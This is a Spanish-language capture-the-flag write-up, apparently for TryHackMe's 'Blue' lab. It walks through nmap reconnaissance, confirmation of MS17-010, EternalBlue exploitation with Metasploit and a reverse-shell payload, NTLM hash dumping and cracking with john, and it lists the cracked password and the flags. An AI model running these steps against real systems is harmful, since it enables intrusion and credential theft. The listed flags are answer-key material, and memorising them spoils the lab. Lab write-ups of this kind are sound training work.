---
title: Untitled
date: 2023-02-15
---

## Reconocimiento

Antes de comenzar comprobamos mediante [[ping]] que la máquina se encuentra activa, además en base al ttl ([[Fingerprinting]]), podemos presuponer que se trata de una máquina **windows**.

Procedemos ahora a buscar puertos abiertos con [[nmap]]:

```bash
nmap -sS -p- --open --min-rate 5000 -n -Pn <ip>
```
```bash
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
```

Vemos algunos puertos interesantes, así que procedemos con un escaneo más exahustivo:

```bash
nmap -sS -p135,139,445,3389,49152,49153,49154,49158,49159 -sCV -n -Pn <ip>
```
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-02-15T19:38:05+00:00; 0s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h30m00s, deviation: 3h00m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:df:b4:90:66:e7 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-15T13:37:50-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-15T19:37:50
|_  start_date: 2023-02-15T19:28:53
```

Vemos que tenemos un servicio *samba*, que podría ser interesante. Para tratar de buscar posibles vulns, buscaremos en internet vulns para `Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)`. Encontrando que posiblemente sea vulnerable al [[EternalBlue]] (*MS17-010*). Para comprobarlo, utilizaremos de nuevo nmap:

```bash
nmap -sS -p445 --script vuln -n -Pn <ip>
```
```bash
[...]
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
[...]
```

O bien:

```bash
nmap -p 445 --script=smb-vuln-ms17-010.nse <ip>
```
```bash
[...]
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
[...]
```

## Explotación

En este punto nos encontramos ante un [[EternalBlue]], así que tenemos dos opciones, expllotarlo mediante [[metasploit]] o manualmente:

#### Metasploit

Comenzamos abriendo la consola de metasploit, y buscamos *ms17-10*:

```bash
msfconsole
```
```bash
search ms17-10
```

Y utilizaremos un exploit llamado `exploit/windows/smb/ms17_010_eternalblue`, así que selecccionamos dicha opción:

```bash
use <option>
```

Con `set` guardamos en `RHOST` la ip de la máquina objetivo y en `LHOST` la de nuestra máquina y ejecutamos `run`. En ocasiones puede ser que no funcione a la primera, en tal caso simplemente repite el proceso.

OPCIONAL - En caso de querer, *tryhackme* nos recomienda que ejecutemos antes del run, `set payload windows/x64/shell/reverse_tcp`, esto es para que luego tengamos que realizar un tratamiento de la tty para migrar una shell normal a una de *meterpreter*.

En este caso simplemente debemos pulsar CTL+Z para poner la sesión en segundo plano y seguidamente, utilizar el exploit `post/multi/manage/shell_to_meterpreter`. Simplemente cambiamos el `LHOST` y `session` con `set`, asignándo nuestra ip y el id de sesión (podemos verlo con `sessions -l`). Si no funciona tocará repetir los pasos anteriores, sin embargo, en caso de éxito tendríamos una shell con mayor funcionalidad y estabilidad. Una vez completado volvemos a la sesion con `sessions <session id>`.

#### Manualmente

to do

## Escalada de privilegios

En caso de tener éxito, ya tendríamos una shell con máximos privilegios, tanto con metasploit como si lo hemos hecho manual (es lo bueno del eternalblue):

```bash
C:\Windows\system32>whoami
whoami
nt authority\system
```

## Obteniendo y crackeando los hashes

#### Con meterpreter (metasploit)

Una vez tenemos la sesión de meterpreter, podemos obtener los hashes con `hashdump`:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

En este punto podríamos tratar de crackear los hashes con [[john]]:

```bash
john --format=nt -w=/usr/share/wordlists/rockyou.txt hashes.txt
```
```bash
                 (Administrator)     
alqfna22         (Jon)
```

Como vemos obtenemos las credenciales del usuario `Jon:alqfna22`.

En este punto, podemos spawnear una shell de meterpreter con `shell`, y la primera flag se encuentra en `C:\` (`flag{access_the_machine}`), la segunda en `C:\Windows\System32\config` (`flag{sam_database_elevated_access}`), y la tercera en `C:\Users\Jon\Documents` (`flag{admin_documents_can_be_valuable}`).